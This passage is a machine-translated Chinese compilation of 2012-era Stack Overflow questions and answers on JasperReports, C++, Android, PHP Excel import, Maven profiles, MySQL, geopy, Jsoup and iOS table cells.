在我向您展示如何执行此操作之前，请注意仅更改页面大小可能无法满足您的需求。它将根据您的需要使页面变大或变小，放置元素的位置不会改变。在您的情况下，报告甚至可能无法编译，具体取决于您放置项目的位置。

不过，您确实有几个选择：

1.  首先，您可以为 A5 格式创建第二个报告，然后在运行时根据您的需要获取适当的报告。这可能是最简单的解决方案，但这确实意味着您最终会得到几乎 2 个相同的报告。这意味着将来您必须在两个地方进行任何更改。
2.  其次，如果它是一个具有典型布局的相当直接的报告，您可以使用[Dynamic Jasper](http://dynamicjasper.com/)之类的东西在 Java 代码中生成您的报告。
3.  最后，您可以直接使用 Jasper Report 的 API 在运行时生成您的报告。

* * *

现在回答你的问题。首先将 JRXml 文件加载到一个`JasperDesign`对象中：

```
//Note JRXMLLoader could also take a File object or 
//InputStream instead of a String as the parameter.
JasperDesign design = JRXmlLoader.load("report.jrxml"); 
```

一旦你有了，`JasperDesign`你可以将页面大小设置为你想要的。据我所知，A5 纸是 5.83" × 8.27"。要将其转换为 JasperReports 理解的大小，将每个乘以 72，得到 420 x 596（我四舍五入，因为我们必须设置整数）。

```
design.setPageHeight(596);
design.setPageWidth(420); 
```

从那里您可以像往常一样继续您的出口冒险。

# c++ - 如何在另一个类的对象上调用一个类的函数？

> ID：10772245
> 
> 赞同：4
> 
> 时间：2012-05-27T07:05:05.530
> 
> 标签：c++, oop, class, function, function-call

如何在一个类中调用一个方法而不是使用另一个类？

我有 ;

```
class A { 
 public :
  foo ( ) ;
};

class B {
 public :
  bar ( ) ;
}; 
```

在主要：

```
A data ;          // I am creating instance of class A 

data . bar ( ) ;  //  but, I am calling a method of another class

                  // how can I do that ? 
```

注意：我找不到合适的标题。如果你有，请随时分享或编辑

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T07:29:17.233

除非这两个类是相关的（通过继承）你不能这样做。

成员函数对其所属的类的实例执行一些操作。
您创建了一个类对象，`A`因此您只能`A`通过它调用成员函数。

磨苹果并希望得到芒果奶昔，这不会真的发生。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T07:33:59.510

使用公共继承：

```
class B {
 public:
  void bar();
};

class A : public B
{ };

int main() {
 A a;
 a.bar();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T07:09:29.220

我想如果你想在 A 对象上使用 .bar() 必须由 B 继承。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-11-14T21:29:55.657

您可以使用函数指针。使它不是静态的唯一方法是使用模板。

```
class A
{ 
  public:
  void setBar(void (*B::func)(void)) { bar = func; };
  void callBar() { bar(); };

  private:
  void(*B::bar)(void);
};

class B
{
  public:
  static void bar() { printf("you called bar!"); };
};

int main() {
  A a;
  a.setBar(B::bar);
  a.callBar();
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-27T07:41:37.677

目前尚不清楚您想做`data.bar()`什么。

`bar()`由于无法访问 A 的数据，因此`bar()`与变量 没有任何关系`data`。所以，我会争辩说，这`data.bar()`是不必要的，你的目标是`bar()`. 想必如果`bar()`只是一个函数，可以声明`static`并调用`B.data()`

另一种选择是您想要其他人已经写过的继承。[小心继承，确保只有在存在 is-a 关系并且满足Liskov 原则](http://en.wikipedia.org/wiki/Liskov_substitution_principle)时才从 B 继承A。不要仅仅因为你必须调用而从 B 继承`bar()`。

如果你想使用 B，你可以在 A 中拥有一个 B 的实例。阅读关于[优先组合而不是继承的信息](http://en.wikipedia.org/wiki/Composition_over_inheritance)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-27T09:24:06.197

我认为您应该阅读 1 或 2 c plus plus 书籍，并大致了解课程的内容以及它们的目的。

一些建议：Bjarne Stroustrup 的 C++ 编程或 Bruce Eckel 的 Thinking in c++ 或在网上搜索教程。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-05-27T08:44:44.500

正如每个人在回答中所说的那样。这是一个坏主意，而且不可能。

你只能使用没有人真正知道它会如何表现的技巧。

您可以获取对象 A 的指针并将其转换为 B 的指针。

同样，唯一的用途是向其他人展示不该做什么。

```
A a;
B* b = (B*)&a;
b->bar(); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-06-18T02:39:18.893

您还可以将 class 声明`B`为`friend`of class `A`。

我相信它的语法是：

```
class A {
    public:
        foo();
    friend class B;
};
class B {
    public:
        bar();
}; 
```

但是有了这个，我相信你只能使用函数`A`内部的`B`函数/变量。继承可能是您更好的方法。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2014-12-30T04:33:45.403

虽然这个问题很奇怪！，但这里有一些解决方案使用继承

```
class A: public B 
```

类型转换

```
A data;
((B*)&data)->bar(); 
```

或重新诠释演员表

```
B* b = reinterpret_cast <B*> (&data);
b->bar(); 
```

如果 bar() 使用 B 的任何成员变量，则结果不可预测。

# java - 发送重定向到另一个在 Appfuse 应用程序中不起作用的域

> ID：10772246
> 
> 赞同：2
> 
> 时间：2012-05-27T07:05:17.387
> 
> 标签：java, jakarta-ee, servlets, appfuse

我创建了一个新的 Appfuse 2.1.0 struts2 应用程序，并从我想重定向到**[https://gmail.com](https://gmail.com)**的 servlet ，我使用了以下代码：
*response.sendRedirect(" [https://gmail.com](https://gmail.com) ");*

但是这条线不起作用，我的应用程序没有重定向到我指定的这个域。我是否需要做任何配置才能从我的 appfuse 应用程序重定向到另一个域？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2014-04-16T05:38:59.113

您需要提供以下网址：

```
 response.sendRedirect("https:www.gmail.com"); 
```

# android - 为什么没有通过意图传递长值？

> ID：10772248
> 
> 赞同：1
> 
> 时间：2012-05-27T07:05:41.457
> 
> 标签：android, android-intent, long-integer

嗯，我正在尝试使用 getDate() 方法传递从日历视图中提取的 long 并将其设置为 long 并传递它。它适用于一个按钮，我在同一个界面中有多个按钮，第一个按钮它工作正常，但由于数据未传递，因此发送一个即时消息并发出问题：S

```
 //THis one passes the long without any issues
Create = (Button) findViewById(R.id.CreateApp);
        Create.setOnClickListener(new OnClickListener() {

            public void onClick(View arg0) {
                finish();

                 long date = Present.getDate();
                Intent Crea = new Intent(getApplicationContext(),CreateAppointment.class);
                Crea.putExtra("SelectedDate", date);
                startActivity(Crea);
            }

    }); 
```

//在另一个类中接收时的代码

```
Intent g = getIntent();
final long SDate = g.getLongExtra("SelectedDate", 0);

       //THE PROBLEM ONE :S
       Edit = (Button) findViewById(R.id.VEditApp);
       Edit.setOnClickListener(new OnClickListener() {

            public void onClick(View arViewg0) {
                finish();

                 long date = Present.getDate();
                Intent EDT = new Intent(getApplicationContext(),viewedit.class);
                EDT.putExtra("EDTDate", date);
                startActivity(EDT);
            }

    }); 
```

// 我用来在其他类中接收什么

```
Intent EditRecieve = new Intent();
        long Cur_Date = EditRecieve.getLongExtra("EDTDate", 2); 
```

有人能告诉我为什么我没有得到这个值以及为什么默认值一直被传递吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T07:14:15.360

在您调用新活动::::: 后尝试以这种方式完成您的活动

```
//THis one passes the long without any issues
Create = (Button) findViewById(R.id.CreateApp);
        Create.setOnClickListener(new OnClickListener() {

            public void onClick(View arg0) {

                 long date = Present.getDate();
                Intent Crea = new Intent(getApplicationContext(),CreateAppointment.class);
                Crea.putExtra("SelectedDate", date);
                startActivity(Crea);
                 finish();
            }

    }); 
```

/code 在另一个类中接收时

```
Intent g = getIntent();
final long SDate = g.getLongExtra("SelectedDate", 0);

   //THE PROBLEM ONE :S
   Edit = (Button) findViewById(R.id.VEditApp);
   Edit.setOnClickListener(new OnClickListener() {

        public void onClick(View arViewg0) {

            Intent EDT = new Intent(getApplicationContext(),viewedit.class);
            EDT.putExtra("EDTDate", SDate );
            startActivity(EDT);
            finish();
        }

}); 
```

// 我用来在其他类中接收什么

```
 Intent EditRecieve = new Intent();
    long Cur_Date = EditRecieve.getLongExtra("EDTDate", 2); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T07:31:56.747

在不起作用的示例中，您写道：

```
Intent EditRecieve = new Intent();
long Cur_Date = EditRecieve.getLongExtra("EDTDate", 2); 
```

但是在你的第一个例子中，你写道：

```
Intent g = getIntent();
final long SDate = g.getLongExtra("SelectedDate", 0); 
```

所以看起来像一个简单的错字，用“getIntent()”替换“new Intent()”，你应该很好。

# xml - 如何从带有标签的字符串中解析标签名称及其在Qt中的参数？

> ID：10772249
> 
> 赞同：0
> 
> 时间：2012-05-27T07:05:51.300
> 
> 标签：xml, string, qt, parsing, tags

假设我们有一个带有下一个内容的 QString：`<tag attr1="string" attr2=34 />`如何让 Qt 像往常一样解析这个标签 xml（不使用 QtWebKit）标签说让 sring 对象获取标签名称、值`string`和`attr1`值？`int``attr2`

# iphone - iPhone 显示与模拟器不同

> ID：10772252
> 
> 赞同：0
> 
> 时间：2012-05-27T07:06:45.590
> 
> 标签：iphone, ios, ios-simulator

.

你好，

首先，这个问题可能看起来与我的上一个问题相似，但事实并非如此。供参考，如果你必须比较它是这里[上一个问题](https://stackoverflow.com/questions/10771735/iphone-shows-older-version-of-app)

现在我开发了一个应用程序，它可以在 iPhone 模拟器上完美运行。它不使用模拟器无法处理的任何东西。

我有一个按钮，在代码中生成，它出现在模拟器的我的 mac 上，但没有出现在 2 个测试设备上。1) iPhone4 和 2) iPod Touch 第 4 代。

这怎么可能？

```
-(void)popUpMenu
{
UIImage *image = [UIImage imageNamed:@"Menu01@2x.png"];
UIImage *selectedImage = [UIImage imageNamed:@"Menu02@2x.png"];
UIImage *toggledImage = [UIImage imageNamed:@"Done01@2x.png"];
UIImage *toggledSelectedImage = [UIImage imageNamed:@"Done02@2x.png"];

NSArray *buttons = [NSArray arrayWithObjects:b1, b2, b3, b4, b5, nil];

RNExpandingButtonBar *bar = [[RNExpandingButtonBar alloc] initWithImage:image selectedImage:selectedImage toggledImage:toggledImage toggledSelectedImage:toggledSelectedImage buttons:buttons center:center];

//    RNExpandingButtonBar *bar = [[UIButton buttonWithType:UIButtonTypeRoundedRect] initWithArray:buttons];

[bar setHorizontal:NO];
[bar setExplode:NO];
[self.view addSubview:bar];
[self setBar:bar];
} 
```

该数组是由此出现的一组按钮。Github 的链接是： [Github - RNExpandingButtonBar](https://github.com/rnystrom/RNExpandingButtonBar)

然后我在 viewDidLoad 方法中使用这段代码来显示按钮

```
[self popUpMenu]; 
```

干杯杰夫

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T07:27:39.667

检查代码和工作区中图像名称的大小写，设备区分大小写，OSX 默认不区分大小写。这就是为什么它在您的模拟器中而不是在您的设备上工作的原因。

# c - A Struct 有一个 Struct 数组，里面有数组（和一个数组）：我将如何 malloc 呢？

> ID：10772253
> 
> 赞同：3
> 
> 时间：2012-05-27T07:07:01.317
> 
> 标签：c, arrays, struct, malloc

我目前没有代码，因为我根本不知道该怎么做。我可以自己计算每个较低级别的结构需要多少字节并将其分配给它吗？这真是糟糕的编码，不是吗。这是我试图混合在一起的两个结构：

```
struct property {
    int d;
    char name [111]; // I just malloc this like I would a normal array, right?
    char descr [1025]; // Ditto.
}

struct category {
    int d [413]; // The d's of all the child structs sorted highest to lowest.
    char name [111];
    struct property property [413]; // This. How do I allocate this?
}</code> 
```

我必须做`struct property* property = (struct property*) malloc(sizeof(struct property) * 413);`吗？内部数组的malloc会保持不变吗？结构中的 malloc 一般如何表现？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T07:10:51.393

您的结构中没有指针成员，`property`因此您不需要`malloc`任何结构成员。
当您`malloc`使用该结构时，它将为您提供足够的内存来保存包括数组在内的所有结构成员，异常是指针结构成员（*您没有任何*）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-27T07:13:08.920

你`malloc`没有演员表就可以了。它为整个数组分配连续的内存。结构内的数组都与它一起分配，它们是正确的数组而不是指针。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-27T07:14:05.760

Sizeof 将为您提供整个结构的大小。它正确地考虑了数组和结构的大小。

但是，413 项似乎是任意的。可变大小的结构会更适合您吗？

在这种情况下，提前计算大小以避免 malloc 是一个很好的性能想法。Malloc 可能很慢，它可能需要锁，并且堆会随着时间的推移而碎片化。此示例向您展示如何在结构末尾使用指针而不是数组或可变长度数组创建“可变长度”结构：

```
struct category
{
  int              cItems;  // need this if handling variable # of items now.
  int             *d;  // ptr instead of array
  char            *name;  // ptr again
  struct property  property[0];  // var length array
}

int cItems = 413; // or whatever
// this is a nifty trick to get the size of a variable length struct:
int cbCategory = (size_t)(&((struct category*)0)->property[cItems]);
int cbD = sizeof(int)*cItems;
int cbName = sizeof(char)*cItems;
struct category *pCategory  = (struct category*)malloc(cbCategory + cbD + cbName);
// wire up d:
pCategory->d = (int*)((char*)pCategory + cbCategory);
// or wire d up this way:
pCategory->d = (int*)&pCategory->property[cItems];
// wire up name
pCategory->name = (char*)pCategory->d + cbD;
// or wire up name this way
pCategory->name = (char*)&pCategory->d[cItems];
// set items
pCategory->cItems = cItems; 
```

注意，我假设 d 有 413 个元素。我本可以轻松地将其保留为一个数组。

# php - 导入excel文件时出错

> ID：10772257
> 
> 赞同：-1
> 
> 时间：2012-05-27T07:07:15.793
> 
> 标签：php

我有一个包含我的学生表数据的excel文件。
现在我试图在我的学生表中的 mysql 中导入这个文件。
这是我将数据从 excel 导入我的学生表的代码。

```
<?php
     require_once("class/connection.php");
     include("libs/Excel/reader.php");

    //change-- table name,title and imgdir
    $table_name = "student";
    $title="Excel Import";
    $page = $_SERVER['PHP_SELF'];

    if($_REQUEST["Save"])
    {
        // ExcelFile($filename, $encoding);
        $data = new Spreadsheet_Excel_Reader();
        // Set output Encoding.
        $data->setOutputEncoding('CP1251');
        //assign filename
        $data->read($_FILES['file']['tmp_name']);

    for ($x = 2; $x <= count($data->sheets[0]["cells"]); $x++) 
    {
      $studname = $data->sheets[0]["cells"][$x][1];
      $phno = $data->sheets[0]["cells"][$x][2];
      $mobno = $data->sheets[0]["cells"][$x][3];
      $email = $data->sheets[0]["cells"][$x][4];
      $clgname = $data->sheets[0]["cells"][$x][5];
      $streamname = $data->sheets[0]["cells"][$x][6];
      $remarks = $data->sheets[0]["cells"][$x][7];
      $gender = $data->sheets[0]["cells"][$x][8];
      $address = $data->sheets[0]["cells"][$x][9];

    $query = "INSERT INTO " . $table_name . "(studname,phno,mobno,email,clgname,streamname,remarks,gender,address) 
    values('$studname','$phno','$mobno','$email','$clgname','$streamname','$remarks','$gender','$address')";

        mysql_query($query) or die(mysql_error());
     }
  }  

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Admin Panel -<?php echo $title;?></title>
<link rel="SHORTCUT ICON" type="image/x-icon" href="images/cloelle_favicon.ico">
</head>
<body>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td><?php include("header.php");?></td>
  </tr>
  <tr>
    <td align="center" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">

        <tr>

          <td align="left" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                  </table></td>
                <td width="6"><img src="images/home_box_rt.jpg" width="6" height="28" /></td>
              </tr>
              <tr>
                <td background="images/home_box_lbg.jpg">&nbsp;</td>
                <td height="120" align="center" valign="top" class="successmsg">
                    <?php
                        if($_REQUEST['submit'])
                        {
                            echo "Your data Transfered Successfully!";
                        }
                        else
                        {
                            echo "Please Upload Your Excel File Here!";
                        }
                    ?>
                  <form id="StdForm" name="StdForm" enctype="multipart/form-data" method="post" onsubmit="javascript: return chkValid();">
                    <p>
                      <input type="file" name="file" id="file" />
                    </p>
                    <p>
                      <input type="submit" id="Save" name="Save" class="button" value="submit" />
                    </p>
                  </form></td>
                <td background="images/home_box_rbg.jpg">&nbsp;</td>
              </tr>

            </table></td>

        </tr>

      </table></td>
  </tr>
  <tr>
    <td><?php include("footer.php"); ?></td>
  </tr>
</table>
</body>
</html> 
```

现在，当我运行此代码时，会生成以下错误。

```
The filename C:\xampp\tmp\phpFCD3.tmp is not readable 
```

所以我错过了什么。？
提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T07:16:33.560

确保您尝试读取的文件以 microsoft excel(.xls) 格式保存。尝试使用 excel 阅读器阅读时，我也遇到了同样的错误，然后发现我的 .xls 扩展文件是 CSV 格式的。所以我打开了我的文件并保存为 microsoft Excel(.xls)，它工作正常。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-11-23T04:26:26.283

```
<?php //for CSV

 function myprintCSV($aryData = array(), $filetype = "csv", $fileNamesalt = "csv", $bolCols = true)
  {

 if (!is_array($aryData) || empty($aryData))
    {
      exit(1);
    }

    // header
    header('Content-Description: File Transfer');
	header('Content-Encoding: UTF-8');
	if($filetype=="csv"){
    header("Pragma: public");
	header('Content-Type: text/csv; charset=utf-8');
	header("Content-Disposition: attachment; filename=" . $fileNamesalt . time().".csv");
	}

    header('Expires: 0');
    header('Cache-control: private, must-revalidate');
   header("Pragma: public");
//echo "<pre>";
//print_r($aryData);die;
    // Spaltenoberschriften
    if ($bolCols)
    {
      $aryCols = array_keys($aryData[0]);
      array_unshift($aryData, $aryCols);
    }

    // Ausgabepuffer for fputcsv
    ob_start();

    // output Stream for fputcsv
    $fp = fopen("php://output", "w");
    if (is_resource($fp))
    {
      foreach ($aryData as $aryLine)
      {

		fputcsv($fp, $aryLine, ',', '"');
      }

      $strContent = ob_get_clean();

      // Excel SYLK-Bug
      // http://support.microsoft.com/kb/323626/de
      $strContent = preg_replace('/^ID/', 'id', $strContent);

      //$strContent = utf8_decode($strContent);
      //$intLength = mb_strlen($strContent, 'utf-8');

      // length
      //header('Content-Length: ' . $intLength);

      // kein fclose($fp);
		echo "\xEF\xBB\xBF"; 
      echo $strContent;
      exit(0);
    }
    ob_end_clean();
    exit(1);
  }

//end

//

function createColumnsArray($end_column, $first_letters = '')
{
  $columns = array();
  $length = strlen($end_column);
  $letters = range('A', 'Z');

  // Iterate over 26 letters.
  foreach ($letters as $letter) {
      // Paste the $first_letters before the next.
      $column = $first_letters . $letter;

      // Add the column to the final array.
      $columns[] = $column;

      // If it was the end column that was added, return the columns.
      if ($column == $end_column)
          return $columns;
  }

  // Add the column children.
  foreach ($columns as $column) {
      // Don't itterate if the $end_column was already set in a previous itteration.
      // Stop iterating if you've reached the maximum character length.
      if (!in_array($end_column, $columns) && strlen($column) < $length) {
          $new_columns = createColumnsArray($end_column, $column);
          // Merge the new columns which were created with the final columns array.
          $columns = array_merge($columns, $new_columns);
      }
  }

  return $columns;
}
```

# android - 为 sqlite 检索单行中的列的值

> ID：10772261
> 
> 赞同：0
> 
> 时间：2012-05-27T07:08:10.623
> 
> 标签：android, sqlite

试图在我的android应用程序的sqlite中获取“选项”列=“lastclick”的“值”列的值。

这是我的函数代码：

```
public String getLastClick() {
    SQLiteDatabase db = this.getReadableDatabase();
    Cursor cursor = db.rawQuery("SELECT value FROM config where option='lastclick'", null);
    cursor.moveToFirst();
    return cursor.getString(0);
} 
```

它似乎无法正常工作...我将以下代码用于条件语句，即使我第一次在 VD 上安装应用程序，它也不会将字符串识别为 0，我的 onCreate 函数插入一行将“lastclick”值“0”放入数据库。

无论如何，这是代码：

```
 DatabaseHandler db = new DatabaseHandler(this);
    String lastClick = db.getLastClick();

    // check if its the first time they've ever clicked
    if (lastClick != "0") {
        String millis = String.valueOf(Long.parseLong(dateString) - Long.parseLong(lastClick));
        db.insertRecord(millis);
    } 
```

“option”和“value”都是varchar。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T07:19:27.443

比较的正确方法`Strings`是使用`equals`方法，所以而不是：

```
if (lastClick != "0") { 
```

写：

```
if (!lastClick.equals("0")) { 
```

# java - 为 dev/QA/prod 配置 Java EE 6

> ID：10772263
> 
> 赞同：4
> 
> 时间：2012-05-27T07:08:37.573
> 
> 标签：java, maven, configuration, java-ee-6, properties-file

我有一个使用 Maven 构建的 Java EE 6 应用程序，在 NetBeans 7 中编写代码并部署在 GlassFish 3.1.2 上。当我接近完成时，我发现自己正在部署演示版本。

问题是我没有任何简单的方法来构建不同的环境，例如 dev、QA、demo、prod 等。对于某些东西，我一直在使用带有一堆返回的静态 getter 的 Java 类值基于环境常数的值。但这并不能帮助我有条件地设置

*   javax.faces.PROJECT_STAGE (web.xml)
*   数据库凭据（glassfish-resources.xml）
*   邮件服务器（glassfish-resources.xml）
*   JPA 日志记录级别 (persistence.xml)

可能还有一些我现在想不起来的其他事情，它们分散在 XML 文件中。

有没有办法定义这些配置文件的多个版本，并在构建时设置一个标志来选择环境，而在没有指定环境时默认为 dev？在这种情况下，有没有办法让 Maven 为我工作？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-27T07:17:39.883

您可以使用[Maven](http://maven.apache.org/)来实现这一点。尤其是使用[资源过滤](http://maven.apache.org/plugins/maven-resources-plugin/examples/filter.html)。

首先，您可以定义配置文件列表：

```
 <profiles>
    <profile>
      <id>dev</id>
      <properties>
        <env>development</env>
      </properties>
      <activation>
        <activeByDefault>true</activeByDefault> <!-- use dev profile by default -->
      </activation>
    </profile>
    <profile>
      <id>prod</id>
      <properties>
        <env>production</env>
      </properties>
    </profile>
  </profiles> 
```

然后是您需要过滤的资源：

```
 <build>
    <outputDirectory>${basedir}/src/main/webapp/WEB-INF/classes</outputDirectory>
    <filters>
      <filter>src/main/filters/filter-${env}.properties</filter> <!-- ${env} default to "development" -->
    </filters>
    <resources>
      <resource>
        <directory>src/main/resources</directory>
        <includes>
          <include>**/*.xml</include>
          <include>**/*.properties</include>
        </includes>
        <filtering>true</filtering>
      </resource>
    </resources>
  </build> 
```

然后您的自定义属性基于目录中的配置文件`src/main/filters`：

**过滤器-development.properties**

```
# profile for developer
db.driver=org.hsqldb.jdbcDriver
db.url=jdbc:hsqldb:mem:web 
```

和

**过滤器生产属性**

```
# profile for production
db.driver=com.mysql.jdbc.Driver
db.url=jdbc:mysql://localhost:3306/web?createDatabaseIfNotExist=true 
```

`mvn clean package -Pprod`要使用生产配置文件，您可以使用命令打包 war 。

[在这里](https://github.com/paukiatwee/webapp-bootstrap)您可以看到在 maven 中使用 profile 的示例项目。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T07:32:17.803

*这不是对问题的直接回应。这解释了管理 env 属性的 diff 策略管理 diff env 属性* 的另一种方法是使用数据库来存储属性。这样你只需要管理数据库的配置。根据您指向的数据库，您可以从该数据库加载属性。如果您使用的是 spring，那么 spring 会提供 PropertyPlaceholderConfigurer，它可以从 DB 初始化属性。这种方法允许您在不进行构建的情况下更改属性值。

如果您想推广由 QA\Testing 团队测试的工件，这种方法很有用。在这种情况下，数据库配置不会成为构建过程生成的工件的一部分。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T15:08:20.647

如果您需要配置 web.xml，请查看以下方法： [https ://community.jboss.org/docs/DOC-19076](https://community.jboss.org/docs/DOC-19076)

它使用与另一个答案中描述的相同的方法（资源过滤）。

# mysql - 从 active=1 开始选择天，如果 active=0，则不执行任何操作

> ID：10772264
> 
> 赞同：0
> 
> 时间：2012-05-27T07:08:39.647
> 
> 标签：mysql, group-by

我有天数、版本和活动的表格。

在表中，我有相同的日子，其中 active = 1 和 active = 0 我需要从数据库中获取这些天，其中 active = 1 并且 version_id 是最大值。为此，我编写了以下查询：

```
SELECT 'MAX(version_id)',DAY, active FROM `day` group by day, active 
```

但是第 28 天和第 29 天是重复的，所以当我使用“AND active = 0”时，它会显示第 28 天的 active = 1（并且 MAX(VERSION_ID) 较低，但不应该看到那一天。

查询结果：[http ://screenshooter.net/0562655/27_05_2012__09_02_56](http://screenshooter.net/0562655/27_05_2012__09_02_56)

所以：“在 VERSION_ID 为 MAX 且 DAY IS ACTIVE 的所有日子里显示给我，如果 active = 0，则不显示早期版本”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T07:19:55.987

这是使用嵌套查询的方法：

```
SELECT * FROM `day`
WHERE `active` = 1 AND version_id = (
    SELECT MAX(version_id) FROM `day`
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T07:37:39.023

尝试这个 -

```
SELECT * 
FROM day
WHERE version_id IN (SELECT MAX(d.version_id) 
                    FROM day d
                    WHERE active = 1
                    GROUP BY d.day)
OR active = 0 
```

# python - Geopy 异常处理

> ID：10772269
> 
> 赞同：1
> 
> 时间：2012-05-27T07:10:04.343
> 
> 标签：python, exception, geopy

**回溯（最近一次调用最后一次）：
文件“C:\Users\Penguin\workspace\geocode-nojansdatabase\src\geocode.py”，第 15 行，
就位，(lat, lng) = g.geocode(a)
文件“ C:\Python27\lib\site-packages\geopy-0.94.2-py2.7.egg\geopy\geocoders\google.py”，第 81 行，在地理编码中
返回 self.geocode_url(url,exact_one)
文件“C: \Python27\lib\site-packages\geopy-0.94.2-py2.7.egg\geopy\geocoders\google.py”，第 88 行，在 geocode_url
返回调度（页面，exact_one）
文件“C:\Python27\lib \site-packages\geopy-0.94.2-py2.7.egg\geopy\geocoders\google.py"，第 111 行，在 parse_xml
"(Found %d.)" % len(places))
ValueError: 没有找到一个地标！（找到 3 个。）**

当 geopy 遇到不喜欢的地址时，我的应用程序会终止。我想知道的是如何在 Python 中捕获异常并允许我的程序继续下一个条目。源代码如下：

```
import csv
from geopy import geocoders
import time

g = geocoders.Google()

spamReader = csv.reader(open('locations.csv', 'rb'), delimiter='\t', quotechar='|')

f = open("output.txt",'w')

for row in spamReader:
     a = ', '.join(row)
     #exactly_one = False
     time.sleep(1)
     place, (lat, lng) = g.geocode(a)
     b = "\"" + str(place) + "\"" + "," + str(lat) + "," + str(lng) + "\n"
     print b
     f.write(b) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T07:32:30.317

要使您的程序忽略 ValueError 而不是终止它，请通过替换来捕获异常：

```
 place, (lat, lng) = g.geocode(a) 
```

和：

```
 try:
     place, (lat, lng) = g.geocode(a)
 except ValueError:
     continue 
```

（这`continue`使它进入for循环的下一个重复，而不是尝试执行当前循环的其余部分——这似乎是正确的做法，因为当前循环的其余部分取决于位置、纬度、lng） .

或者，如果您希望它打印一条消息，请使用

```
 try:
     place, (lat, lng) = g.geocode(a)
 except ValueError as error_message:
     print("Error: geocode failed on input %s with message %s"%(a, error_message))
     continue 
```

或类似的规定。

# java - Java 使用 JSOUP 从 HTML 源代码中获取 RSS 链接

> ID：10772271
> 
> 赞同：1
> 
> 时间：2012-05-27T07:10:11.100
> 
> 标签：java, rss, jsoup, html-parser

我正在尝试从 html 源代码中获取 RSS 链接。我使用[Jsoup](http://jsoup.org/) java 库来查找 rss 链接。我写了一小段代码来获取 RSS 链接，但不幸的是它不适用于所有网站。下面是我的代码

```
String url = "http://www.smashingmagazine.com/"; // not working
Document doc = Jsoup.connect(url).get();
Elements links = doc.select("link[type=application/rss+xml]");

if (links.size() > 0) {
    String rss_url = links.get(0).attr("href").toString();
} else {
    // RSS url not found
} 
```

上述代码不适用于所有网站。请解决我的问题。（我正在尝试查找 RSS 2.0 链接）

谢谢你

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-26T12:19:21.943

答案是 ：

```
String url = "http://www.smashingmagazine.com/"; // not working
Document doc = Jsoup.connect(url).get();

Elements links = doc.select("link[type=application/rss+xml]");

if (links.size() > 0) {
    String rss_url = links.get(0).attr("abs:href").toString();
} else {....
    // RSS url not found
} 
```

我希望你会没事的。它适用于 .attr(* *"abs:* *href")

二图

# iphone - UITableViewCell 的 viewDidAppear

> ID：10772272
> 
> 赞同：37
> 
> 时间：2012-05-27T07:10:34.407
> 
> 标签：iphone, objective-c, ios, uitableview, viewdidappear

我通常在视图完成出现后使用`viewDidAppear`方法在视图上做一些 UI 的东西，我在各种情况下都使用了这个方法，它非常有用，但是，我需要在它完成出现后对视图做一些 UI 更改`UITableViewCell`，有没有可用的SDK 中的方法做类似的工作，`viewDidAppear`但对于`UITableViewCell`?

ps`willDisplayCell`在我的情况下不起作用，`didDisplayCell`如果它确实存在，我需要类似的东西。

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2016-05-07T10:52:31.090

具有以下`UITableViewDelegate`功能：

```
func tableView(_ tableView: UITableView, willDisplay cell: UITableViewCell, forRowAt indexPath: IndexPath)

func tableView(_ tableView: UITableView, didEndDisplaying cell: UITableViewCell, forRowAt indexPath: IndexPath) 
```

单元格本身没有回调。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-07-27T12:01:37.623

如果需要响应单元格框架的变化并调整布局，则需要`-layoutSubviews`在单元格类中实现。记得打电话`[super layoutSubviews]`。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-27T09:07:38.093

该方法`viewDidLoad`与 UIViewController 及其子类有关，因此我们不能在 UITableViewCell 中使用它，它是 UIView 的子类。我在我的一个应用程序中使用的解决方案是覆盖`layoutSubViews`UITableViewCell 的方法，并且我将操作延迟了一段时间，如下所示。

```
- (void)layoutSubViews
{
     [super layoutSubviews];

     [self performSelector:@selector(myMethod) withObject:nil afterDelay:1.0];
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-06-23T10:03:58.053

您可以`didMoveToSuperview`在那里使用并进行单元更新

```
override func didMoveToSuperview() {
    super.didMoveToSuperview()

    if superview != nil {
        // Update the cell
    }
} 
```

如果您需要更快的东西，请使用`willDisplayCell`

```
func tableView(_ tableView: UITableView, willDisplayCell cell: UITableViewCell, forRowAtIndexPath indexPath: NSIndexPath) {
    // Update the cell
} 
```

